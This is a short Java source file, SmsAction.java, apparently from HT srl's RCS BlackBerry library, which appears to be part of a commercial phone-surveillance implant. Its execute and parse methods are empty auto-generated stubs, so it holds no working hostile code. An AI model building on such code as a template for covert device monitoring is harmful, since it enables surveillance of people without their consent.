/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SmsAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import blackberry.event.Event;

public class SmsAction extends SubAction {

    public SmsAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    public boolean execute(final Event triggeringEvent) {
        // TODO Auto-generated method stub
        return false;
    }

    protected boolean parse(final byte[] confParams) {
        // TODO Auto-generated method stub
        return false;
    }

}
